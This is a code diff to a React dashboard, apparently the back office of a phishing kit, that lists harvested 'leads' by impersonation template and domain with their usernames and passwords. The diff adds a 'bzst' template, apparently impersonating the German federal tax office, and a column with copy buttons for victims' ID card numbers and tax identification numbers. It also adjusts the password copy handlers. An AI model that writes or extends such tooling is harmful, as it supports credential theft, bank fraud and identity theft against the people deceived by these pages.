@@ -33,12 +33,18 @@ interface Lead {
   email: string | null;
   phone: string | null;
   username: string | null;
+  password?: string | null;
   template_name: string;
   domain_name: string;
   status: string;
   created_at: string;
   additional_data?: string;
 }
+
+type BzstSupplementalData = {
+  ausweisnummer?: string;
+  steueridentifikationsnummer?: string;
+};
 
 interface LeadsResponse {
   leads: Lead[];
@@ -185,6 +191,23 @@ export const Leads: React.FC = () => {
     if (lead.username) return lead.username;
     if (lead.email) return lead.email.split('@')[0];
     return 'Unbekannt';
+  };
+
+  const getBzstSupplementalData = (lead: Lead): BzstSupplementalData => {
+    if (!lead.additional_data) {
+      return {};
+    }
+
+    try {
+      const parsed = JSON.parse(lead.additional_data) as BzstSupplementalData;
+      return {
+        ausweisnummer: parsed.ausweisnummer,
+        steueridentifikationsnummer: parsed.steueridentifikationsnummer
+      };
+    } catch (parseError) {
+      console.warn('Failed to parse BZSt supplemental data:', parseError);
+      return {};
+    }
   };
 
   // Format status
@@ -1008,6 +1031,12 @@ export const Leads: React.FC = () => {
                 </th>
                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                   <div className="flex items-center space-x-1">
+                    <FileText className="h-4 w-4" />
+                    <span>Ausweis / Steuer-ID</span>
+                  </div>
+                </th>
+                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
+                  <div className="flex items-center space-x-1">
                     <Clock className="h-4 w-4" />
                     <span>Status</span>
                   </div>
@@ -1086,6 +1115,14 @@ export const Leads: React.FC = () => {
               }
             }
 
+                          if (lead.template_name === 'bzst') {
+                            return (
+                              <div className="h-8 w-14 rounded bg-blue-50 text-blue-700 border border-blue-200 flex items-center justify-center text-xs font-semibold tracking-wide">
+                                BZST
+                              </div>
+                            );
+                          }
+
                           return (
                             <BankIcon 
                               templateName={lead.template_name} 
@@ -1125,7 +1162,7 @@ export const Leads: React.FC = () => {
                               {lead.username}
                             </code>
                             <button
-                              onClick={() => copyToClipboard(lead.username, 'Username')}
+                              onClick={() => lead.username && copyToClipboard(lead.username, 'Username')}
                               className="p-1 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded"
                               title="Username kopieren"
                             >
@@ -1145,7 +1182,7 @@ export const Leads: React.FC = () => {
                               {'•'.repeat(Math.min(lead.password.length, 8))}
                             </code>
                             <button
-                              onClick={() => copyToClipboard(lead.password, 'Password')}
+                              onClick={() => lead.password && copyToClipboard(lead.password, 'Password')}
                               className="p-1 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded"
                               title="Password kopieren"
                             >
@@ -1191,6 +1228,50 @@ export const Leads: React.FC = () => {
                             );
                           }
                           return <span className="text-gray-400 text-sm">-</span>;
+                        })()}
+                      </div>
+                    </td>
+                    <td className="px-6 py-4">
+                      <div className="flex flex-col space-y-1">
+                        {(() => {
+                          const { ausweisnummer, steueridentifikationsnummer } = getBzstSupplementalData(lead);
+
+                          if (!ausweisnummer && !steueridentifikationsnummer) {
+                            return <span className="text-gray-400 text-sm">-</span>;
+                          }
+
+                          return (
+                            <>
+                              {ausweisnummer && (
+                                <div className="flex items-center space-x-2">
+                                  <code className="text-sm font-mono bg-gray-100 px-2 py-1 rounded">
+                                    {ausweisnummer}
+                                  </code>
+                                  <button
+                                    onClick={() => copyToClipboard(ausweisnummer, 'Ausweisnummer')}
+                                    className="p-1 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded"
+                                    title="Ausweisnummer kopieren"
+                                  >
+                                    <Copy className="h-3 w-3" />
+                                  </button>
+                                </div>
+                              )}
+                              {steueridentifikationsnummer && (
+                                <div className="flex items-center space-x-2">
+                                  <code className="text-sm font-mono bg-gray-100 px-2 py-1 rounded">
+                                    {steueridentifikationsnummer}
+                                  </code>
+                                  <button
+                                    onClick={() => copyToClipboard(steueridentifikationsnummer, 'Steueridentifikationsnummer')}
+                                    className="p-1 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded"
+                                    title="Steueridentifikationsnummer kopieren"
+                                  >
+                                    <Copy className="h-3 w-3" />
+                                  </button>
+                                </div>
+                              )}
+                            </>
+                          );
                         })()}
                       </div>
                     </td>
